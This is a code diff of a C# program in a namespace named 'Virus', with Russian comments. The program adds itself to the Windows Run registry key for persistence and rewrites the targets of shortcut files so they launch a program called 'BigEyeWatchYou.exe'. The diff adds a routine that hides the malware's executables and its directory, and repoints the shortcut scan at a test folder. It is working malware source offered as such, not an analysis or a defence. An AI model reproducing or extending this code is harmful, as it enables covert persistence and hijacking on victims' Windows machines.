@@ -1,7 +1,7 @@
 ﻿using System;
 using System.IO;
 using Microsoft.Win32;
-using LnkChanger;
+using ShellLinkChanger;
 
 namespace Virus
 {
@@ -12,25 +12,25 @@ namespace Virus
         static void Main(string[] args)
         {
             SetStartup();
+            HideAll();
 
             // Получение пути к рабочему столу
             var desktopFolder = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
 
+            var testFolder = @"C:\Users\New\Desktop\Test";
+
             // Получение файлов ярлыков
-            var files = LnkHelper.GetAllShortcutsFiles(desktopFolder);
+            var files = ShellLinkHelper.GetAllShellLinkFiles(testFolder);
 
             // Получение абсолютного пути к вредоносной программе
             var targetPath = Path.GetFullPath("BigEyeWatchYou.exe");
 
             foreach (var file in files)
             {
-
-                // Получем путь, который щас указан в ярлык
-                // Если он не содержит путь к нашей вредоносной программе, то меняем
-                var path = LnkHelper.GetShellLinkPath(file.FullName);
-                if (!path.Contains("BigEyeWatchYou.exe"))
+                var link = ShellLinkHelper.GetShellLinkPath(file.FullName);
+                if (!link.Path.Contains("BigEyeWatchYou.exe"))
                 {
-                    LnkHelper.ChangeShortcut(file.FullName, targetPath,
+                    ShellLinkHelper.ChangeShellLink(file.FullName, targetPath,
                         QuotedMarked(Path.GetFileNameWithoutExtension(file.Name)));
                 }
             }
@@ -47,18 +47,42 @@ namespace Virus
         }
 
         /// <summary>
+        /// Меняет атрибуты файлов и директории на скрытые
+        /// </summary>
+        private static void HideAll()
+        {
+            try
+            {
+                File.SetAttributes("BigEyeWatchYou.exe", FileAttributes.Hidden);
+                File.SetAttributes("Virus.exe", FileAttributes.Hidden);
+                new DirectoryInfo(Directory.GetCurrentDirectory()).Attributes |= FileAttributes.Hidden;
+            }
+            catch { }
+        }
+
+        /// <summary>
         /// Добавляет приложение в автозагрузку, если его там нет
         /// </summary>
         private static void SetStartup()
         {
+
             RegistryKey rk = Registry.CurrentUser.OpenSubKey
                 ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
 
             string appFullPath = System.Reflection.Assembly.GetExecutingAssembly().Location;
             string appName = Path.GetFileNameWithoutExtension(appFullPath);
 
+#if DEBUG
+            if (rk.GetValue(appName) != null)
+            {
+                rk.DeleteValue(appName);
+            }
+#endif
+
             if (rk.GetValue(appName) == null)
             {
+                
+
                 rk.SetValue(appName, appFullPath);
             }
         }
